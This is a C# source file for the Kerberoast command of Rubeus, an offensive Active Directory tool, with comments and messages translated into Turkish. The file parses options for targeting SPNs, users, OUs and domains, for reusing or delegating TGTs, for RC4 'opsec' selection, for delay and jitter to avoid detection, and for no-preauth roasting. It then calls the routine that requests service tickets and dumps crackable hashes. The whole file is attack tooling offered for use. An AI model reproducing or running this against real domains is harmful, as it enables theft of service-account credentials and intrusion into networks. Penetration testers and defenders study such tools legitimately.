using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;


namespace Rubeus.Commands
{
    public class Kerberoast : ICommand
    {
        public static string CommandName => "kerberoast";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Eylem: Kerberoasting\r\n");

            string spn = "";
            List<string> spns = null;
            string user = "";
            string OU = "";
            string outFile = "";
            string domain = "";
            string dc = "";
            string ldapFilter = "";
            string supportedEType = "rc4";
            bool useTGTdeleg = false;
            bool listUsers = false;
            KRB_CRED TGT = null;
            string pwdSetAfter = "";
            string pwdSetBefore = "";
            int resultLimit = 0;
            int delay = 0;
            int jitter = 0;
            bool simpleOutput = false;
            bool enterprise = false;
            bool autoenterprise = false;
            bool ldaps = false;
            System.Net.NetworkCredential cred = null;
            string nopreauth = null;

            if (arguments.ContainsKey("/spn"))
            {
                // belirli tek bir SPN'i roast et
                spn = arguments["/spn"];
            }

            if (arguments.ContainsKey("/spns"))
            {
                spns = new List<string>();
                if (System.IO.File.Exists(arguments["/spns"]))
                {
                    string fileContent = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(arguments["/spns"]));
                    foreach (string s in fileContent.Split('\n'))
                    {
                        if (!String.IsNullOrEmpty(s))
                        {
                            spns.Add(s.Trim());
                        }
                    }
                }
                else
                {
                    foreach (string s in arguments["/spns"].Split(','))
                    {
                        spns.Add(s);
                    }
                }
            }
            if (arguments.ContainsKey("/user"))
            {
                // belirli bir kullaniciyi (veya virgulle ayrilmis kullanicilari) roast et
                user = arguments["/user"];
            }
            if (arguments.ContainsKey("/ou"))
            {
                // belirli bir OU'daki kullanicilari roast et
                OU = arguments["/ou"];
            }
            if (arguments.ContainsKey("/domain"))
            {
                // belirli bir domain'deki kullanicilari roast et
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                // kerberoasting icin belirli bir domain controller kullan
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                // kerberoast edilen hash'leri konsol yerine bir dosyaya ciktila
                outFile = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/simple"))
            {
                // kerberoast edilen hash'leri konsola, ancak dosya cikti formatinda ciktila
                simpleOutput = true;
            }
            if (arguments.ContainsKey("/aes"))
            {
                // AES sifreleme etkin kullanicilari ara ve AES ticket'lari talep et
                supportedEType = "aes";
            }
            if (arguments.ContainsKey("/rc4opsec"))
            {
                // AES sifrelemesi etkin olmayan kullanicilari roast etmek icin ara
                supportedEType = "rc4opsec";
            }
            if (arguments.ContainsKey("/ticket"))
            {
                // talep/roast ederken mevcut bir TGT ticket'i kullan
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else if (System.IO.File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = System.IO.File.ReadAllBytes(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine("\r\n[X] /ticket:X bir .kirbi dosyasi veya base64 kodlu bir .kirbi olmalidir\r\n");
                }
            }

            if (arguments.ContainsKey("/usetgtdeleg") || arguments.ContainsKey("/tgtdeleg"))
            {
                // roast etmek icin kullanilacak devredilmis bir TGT almak icin TGT devir hilesini kullan
                useTGTdeleg = true;
            }

            if (arguments.ContainsKey("/pwdsetafter"))
            {
                // sifresi belirli bir tarihten sonra ayarlanmis roast edilebilir kullanicilari filtrele
                pwdSetAfter = arguments["/pwdsetafter"];
            }

            if (arguments.ContainsKey("/pwdsetbefore"))
            {
                // sifresi belirli bir tarihten once ayarlanmis roast edilebilir kullanicilari filtrele
                pwdSetBefore = arguments["/pwdsetbefore"];
            }

            if (arguments.ContainsKey("/ldapfilter"))
            {
                // ek LDAP hedefleme filtresi
                ldapFilter = arguments["/ldapfilter"].Trim('"').Trim('\'');
            }

            if (arguments.ContainsKey("/resultlimit"))
            {
                // roast edilebilir kullanici sayisini sinirla
                resultLimit = Convert.ToInt32(arguments["/resultlimit"]);
            }
            
            if (arguments.ContainsKey("/delay"))
            {
                delay = Int32.Parse(arguments["/delay"]);
                if(delay < 100)
                {
                    Console.WriteLine("[!] UYARI: gecikme (delay) milisaniye cinsindendir! Lutfen 100'den buyuk bir deger girin.");
                    return;
                }
            }

            if (arguments.ContainsKey("/jitter"))
            {
                try
                {
                    jitter = Int32.Parse(arguments["/jitter"]);
                }
                catch {
                    Console.WriteLine("[X] Jitter 1-100 arasinda bir tam sayi olmalidir.");
                    return;
                }
                if(jitter <= 0 || jitter > 100)
                {
                    Console.WriteLine("[X] Jitter 1-100 arasinda olmalidir");
                    return;
                }
            }

            if (arguments.ContainsKey("/stats"))
            {
                // kerberoast edilebilir kullanici sayisi hakkinda istatistik goster, hicbir seyi gercekten roast etme
                listUsers = true;
            }

            if (arguments.ContainsKey("/enterprise"))
            {
                // talepte enterprise principal kullan, /spn ve (/ticket veya /tgtdeleg) gerektirir
                enterprise = true;
            }
            if (arguments.ContainsKey("/autoenterprise"))
            {
                // SPN ile roast etme basarisiz olursa talepte enterprise principal kullan; /ticket veya /tgtdeleg gerektirir, /spn veya /spns saglanmissa hicbir sey yapmaz
                autoenterprise = true;
            }
            if (arguments.ContainsKey("/ldaps"))
            {
                ldaps = true;
            }

            if (String.IsNullOrEmpty(domain))
            {
                // mevcut domain'i almaya calis
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
            }

            if (arguments.ContainsKey("/creduser"))
            {
                // baglanti kimlik bilgileri icin alternatif bir kullanici sagla
                if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine("\r\n[X] /creduser belirtimi fqdn formatinda olmalidir (domain.com\\user)\r\n");
                    return;
                }

                string[] parts = arguments["/creduser"].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                // baglanti kimlik bilgileri icin alternatif bir sifre sagla
                if (!arguments.ContainsKey("/credpassword"))
                {
                    Console.WriteLine("\r\n[X] /creduser belirtilirken /credpassword gereklidir\r\n");
                    return;
                }

                string password = arguments["/credpassword"];

                cred = new System.Net.NetworkCredential(userName, password, domainName);
            }

            // on-kimlik-dogrulama gerektirmeyecek sekilde yapilandirilmis bir kullaniciyla roast et
            if (arguments.ContainsKey("/nopreauth"))
            {
                nopreauth = arguments["/nopreauth"];
            }

            if (!String.IsNullOrWhiteSpace(nopreauth) && (String.IsNullOrWhiteSpace(spn) && (spns == null || spns.Count < 1)))
            {
                Console.WriteLine("\r\n[X] /nopreauth belirtilirken /spn veya /spns gereklidir\r\n");
                return;
            }

            Roast.Kerberoast(spn, spns, user, OU, domain, dc, cred, outFile, simpleOutput, TGT, useTGTdeleg, supportedEType, pwdSetAfter, pwdSetBefore, ldapFilter, resultLimit, delay, jitter, listUsers, enterprise, autoenterprise, ldaps, nopreauth);
        }
    }
}